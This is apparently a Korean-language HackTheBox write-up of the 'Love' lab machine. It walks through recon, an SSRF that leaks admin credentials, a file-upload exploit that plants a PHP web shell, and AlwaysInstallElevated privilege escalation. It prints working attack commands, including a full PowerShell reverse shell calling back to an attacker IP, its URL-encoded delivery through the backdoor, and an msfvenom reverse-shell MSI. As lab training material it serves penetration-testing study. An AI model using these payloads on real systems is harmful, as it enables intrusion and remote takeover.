# Love - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3306,443,445,47001,49664,49665,49666,49667,49668,49669,49670,5000,5040,5985,5986,7680,80 -sC -sV -vv -oA love 10.129.48.103
```
<img width="1104" height="500" alt="image" src="https://github.com/user-attachments/assets/df2e7167-d02c-4902-8ad8-9cde5ef83c2d" />
<img width="1104" height="421" alt="image" src="https://github.com/user-attachments/assets/b65b6b56-9b77-4702-be4f-b316d9993293" />

- HTTP(80)
- HTTPS(443)
- SMB(445)
- MYSQL(3306)
- HTTP(5000)
- WINRM(5985)

<br>

- `/etc/hosts`에 `love.htb`추가.
<img width="1104" height="65" alt="image" src="https://github.com/user-attachments/assets/7e7ef15f-4544-473b-b17c-ef78c0d2469c" />

---
## HTTP(80)
- 5000번 포트에 접속시도해보았으나 접근이 불가하였음.
<img width="695" height="192" alt="image" src="https://github.com/user-attachments/assets/b4e75dfa-67a8-4238-bce3-70270a96df32" />

### banner grabbing
<img width="1104" height="242" alt="image" src="https://github.com/user-attachments/assets/aedfee6d-f240-4bfd-9d3f-7dbf0784e592" />

### SSRF
- 기본 계정으로 로그인 시도하였으나 실패.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/9f55e8a6-37be-425c-bf57-f2c671b2648b" />

<br>
<br>

- `ffuf`를 사용하여 `staging.love.htb` 발견.
- `/etc/hosts`에 추가.
```bash
ffuf -w ~/util/subdomains.txt -u http://love.htb -H 'Host:FUZZ.love.htb' -mc all -fs 4388
```
<img width="1104" height="596" alt="image" src="https://github.com/user-attachments/assets/dff993cd-8f70-47a5-b11f-05edd53faa60" />

<br>
<br>

- `Demo`탭에서 url을 스캔할 수 있어서 로컬에서 서버를 생성하여 로컬로 요청 시도하여 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/02441426-85bf-4d9e-8fb0-e67c10e5d0ee" />

<br>
<br>

- `http://127.0.0.1`로 요청을 시도하여 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/c93a471e-66d3-4e2a-a857-aad8033c9630" />

<br>
<br>

- 이전에 접속 시도를 실패한 `http://127.0.0.1:5000`으로 접속 시도하여 계정 획득.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/d351e85f-076f-408b-b559-58b086348ce2" />

### Web shell
- 메인페이지에서는 해당 계정으로 접속이 안되어서 `/admin`으로 접속을 시도하여 로그인 시도.(admin:@LoveIsInTheAir!!!!)
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/fc2b2866-310e-403c-a1a3-6b6a35cdb562" />

<br>
<br>

- `voting system`이라는 프로그램이 실행되고 있는데, 버전은 정확하게 확인할 수 없었음.
- `searchsploit`으로 취약점 탐색.
```bash
searchsploit voting system
```
<img width="1104" height="333" alt="image" src="https://github.com/user-attachments/assets/2f5df582-f4a2-4635-a7e8-a6fa6fab30d0" />

<br>
<br>

- 새로운 `voters`를 추가하면서 이미지파일 대신 php를 업로드하여 명령어를 실행시킬 수 있는 취약점.
```bash
searchsploit -m 49445
```
<img width="1104" height="90" alt="image" src="https://github.com/user-attachments/assets/f634d056-1df2-419b-a9c5-7ae0b9795bbb" />
<img width="1104" height="502" alt="image" src="https://github.com/user-attachments/assets/b6766ed6-4c9b-4962-9f02-1a6a6a95e711" />

<br>
<br>

- web shell 업로드.
```bash
cp /usr/share/webshells/php/simple-backdoor.php .
```
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/09ff2eae-d3f4-4232-a7a9-ec9a669c7db5" />

<br>
<br>

- 명령어 실행 성공.
```bash
curl 'http://love.htb/images/simple-backdoor.php/?cmd=whoami'
```
<img width="1104" height="126" alt="image" src="https://github.com/user-attachments/assets/ee322bb6-cc33-426c-b5d4-3519e3cd3c32" />

<br>
<br>

- powershell reverse shell 코드 생성.
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
<img width="1104" height="140" alt="image" src="https://github.com/user-attachments/assets/0c7db1a5-5c94-4142-a7d4-b038bd4e5aeb" />

<br>
<br>

- 인코딩하여 실행.
```bash
curl 'http://love.htb/images/simple-backdoor.php/?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.14.23%27%2C80%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22%0A'
```
<img width="1104" height="179" alt="image" src="https://github.com/user-attachments/assets/6d61b124-54b3-4d97-bbd0-5dc671ebdde1" />

<br>
<br>

- 셸 획득.
<img width="1104" height="138" alt="image" src="https://github.com/user-attachments/assets/dea949fb-96e2-489a-8436-65521355b52d" />

---
- 특별한 정보를 찾을 수 없어 `winpeas` 실행.
<img width="1104" height="113" alt="image" src="https://github.com/user-attachments/assets/3546f49e-576a-487f-9f1f-e25f5e959ded" />

<br>
<br>

- https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
- `ignite.msi` 생성.
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=tun0 lport=80 -a x64 --platform windows -f msi -o ignite.msi
```
<img width="1104" height="141" alt="image" src="https://github.com/user-attachments/assets/bc28c606-8b30-4c04-ba9e-8e27cb6f4e6c" />

<br>
<br>

- 로컬로부터 다운로드 받아 `msiexec`를 사용하여 리버스 셸 실행.
```powershell
msiexec /quiet /qn /i ignite.msi
```
<img width="1104" height="347" alt="image" src="https://github.com/user-attachments/assets/bf4b5b36-3388-4af2-81fe-e38f5606b471" />

<br>
<br>

- 셸 획득.
<img width="1104" height="202" alt="image" src="https://github.com/user-attachments/assets/ca1067d5-fe6e-4654-9ed2-f4c7a3b984b1" />

---
## FLAG
- `c:\users\phoebe\desktop\user.txt`
<img width="1104" height="236" alt="image" src="https://github.com/user-attachments/assets/5a96ee5f-6b4f-4982-aaf2-08bf1c78894e" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1104" height="236" alt="image" src="https://github.com/user-attachments/assets/562d886d-878b-48be-b42d-117128312b07" />
